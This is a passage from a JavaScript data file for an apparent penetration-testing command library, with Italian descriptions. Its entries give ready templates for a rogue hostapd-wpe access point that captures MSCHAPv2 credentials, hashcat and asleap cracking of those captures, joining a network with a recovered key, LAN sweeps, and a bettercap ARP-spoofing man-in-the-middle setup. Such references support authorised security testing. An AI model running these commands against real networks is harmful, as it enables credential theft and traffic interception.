    category: 'wifi-enterprise', subcategory: 'rogue-radius', group: 'Rogue RADIUS',
    description: 'Alternativa classica a eaphammer: hostapd patchato (WPE) che logga username e challenge/response MSCHAPv2 in `hostapd-wpe.log`, pronti per asleap/hashcat.',
    platform: 'linux', requires: ['no-creds'], protocols: ['eap'],
    tags: ['hostapd-wpe', 'enterprise', 'rogue'],
    template: 'sudo hostapd-wpe /etc/hostapd-wpe/hostapd-wpe.conf',
    params: [],
    refs: [{ label: 'hostapd-wpe', url: 'https://github.com/OpenSecurityResearch/hostapd-wpe' }],
  },
  {
    id: 'wifi-hashcat-5500', name: 'hashcat 5500 — crack MSCHAPv2 (NetNTLMv1)',
    category: 'wifi-enterprise', subcategory: 'rogue-radius', group: 'Crack EAP',
    description: 'Crack offline delle credenziali MSCHAPv2 catturate (mode 5500). Recupera la password del dominio dell’utente. In alternativa `asleap` con una wordlist.',
    platform: 'linux', requires: ['eap-creds'], protocols: ['eap'],
    tags: ['hashcat', '5500', 'mschapv2', 'asleap'],
    template: 'hashcat -m 5500 <capfile>.txt <wordlist>',
    params: [
      { key: 'capfile',  label: 'File hash (NetNTLMv1)', ctx: 'capfile', placeholder: 'mschap' },
      { key: 'wordlist', label: 'Wordlist', placeholder: '/usr/share/wordlists/rockyou.txt' },
    ],
    variants: [
      { id: 'default', label: 'hashcat 5500', template: 'hashcat -m 5500 <capfile>.txt <wordlist>',
        description: 'Crack GPU del challenge/response.' },
      { id: 'asleap',  label: 'asleap', template: 'asleap -C <challenge> -R <response> -W <wordlist>',
        description: 'Tool dedicato MSCHAPv2; estrai challenge/response dal log hostapd-wpe.' },
    ],
  },

  // ════════════════════════════════════════════════════════════
  //  POST-CONNECTION
  // ════════════════════════════════════════════════════════════
  // ── LAN Recon ────────────────────────────────────────────
  {
    id: 'wifi-wpa-supplicant', name: 'wpa_supplicant — connect with PSK',
    category: 'wifi-postauth', subcategory: 'lan-recon', group: 'Connect',
    description: 'Connettiti alla rete con la PSK recuperata per passare alla fase interna. Genera la config con `wpa_passphrase` e collega l’iface (managed, non monitor).',
    platform: 'linux', requires: ['psk'], protocols: ['wpa2'],
    tags: ['wpa_supplicant', 'connect', 'psk'],
    template: 'wpa_passphrase "<essid>" \'<password>\' | sudo tee wpa.conf && sudo wpa_supplicant -B -i <iface> -c wpa.conf && sudo dhclient <iface>',
    params: [
      { key: 'essid',    label: 'ESSID',  ctx: 'essid', placeholder: 'CORP-WIFI' },
      { key: 'password', label: 'PSK',    ctx: 'password', placeholder: 'recovered-psk' },
      { key: 'iface',    label: 'Interfaccia (managed)', ctx: 'iface', placeholder: 'wlan0' },
    ],
    variants: [
      { id: 'default', label: 'wpa_supplicant', template: 'wpa_passphrase "<essid>" \'<password>\' | sudo tee wpa.conf && sudo wpa_supplicant -B -i <iface> -c wpa.conf && sudo dhclient <iface>',
        description: 'Connessione manuale + DHCP.' },
      { id: 'nmcli',   label: 'nmcli', template: 'nmcli dev wifi connect "<essid>" password \'<password>\' ifname <iface>',
        description: 'Connessione veloce con NetworkManager (richiede NM attivo).' },
    ],
  },
  {
    id: 'wifi-lan-sweep', name: 'host discovery — sweep the LAN',
    category: 'wifi-postauth', subcategory: 'lan-recon', group: 'LAN Recon',
    description: 'Una volta connesso e con un IP, mappa la sottorete wireless: gateway, host vivi, servizi. Da qui si passa alla disciplina Pentest (Service Enumeration).',
    platform: 'linux', requires: ['psk'], protocols: ['tcp'],
    tags: ['nmap', 'arp-scan', 'lan'],
    template: 'sudo arp-scan --interface=<iface> --localnet',
    params: [{ key: 'iface', label: 'Interfaccia', ctx: 'iface', placeholder: 'wlan0' }],
    variants: [
      { id: 'default', label: 'arp-scan', template: 'sudo arp-scan --interface=<iface> --localnet',
        description: 'Discovery L2 veloce di tutti gli host della sottorete.' },
      { id: 'nmap',    label: 'nmap ping sweep', template: 'sudo nmap -sn $(ip -4 -o addr show <iface> | awk \'{print $4}\')',
        description: 'Ping sweep sulla sottorete dell’interfaccia.' },
    ],
  },
  // ── MITM ─────────────────────────────────────────────────
  {
    id: 'wifi-bettercap', name: 'bettercap — MITM on the WLAN',
    category: 'wifi-postauth', subcategory: 'mitm', group: 'MITM',
    description: 'Una volta sulla rete, bettercap fa ARP spoofing, sniffing e manipolazione del traffico sul segmento wireless. Avvialo sull’iface connessa (managed).',
    platform: 'linux', requires: ['psk'], protocols: ['tcp'],
    tags: ['bettercap', 'mitm', 'arp-spoof'],
    template: 'sudo bettercap -iface <iface>',
    params: [{ key: 'iface', label: 'Interfaccia', ctx: 'iface', placeholder: 'wlan0' }],
    note: '# Dentro la console bettercap\n```\nnet.probe on\nset arp.spoof.targets <ip-vittima>\narp.spoof on\nnet.sniff on\n```',
    refs: [{ label: 'bettercap', url: 'https://www.bettercap.org/' }],
  },
];

// Append to the global command library (built-ins from data.js stay intact).
// MUST mutate the existing array in place — app.jsx closes over the `const COMMANDS`
// from data.js, which is the same object as window.COMMANDS. Reassigning window.COMMANDS
// would leave that const pointing at the old array.
if (window.COMMANDS && Array.isArray(window.COMMANDS)) {
  window.COMMANDS.push(...WIFI_COMMANDS);
} else {
  window.COMMANDS = WIFI_COMMANDS.slice();
}
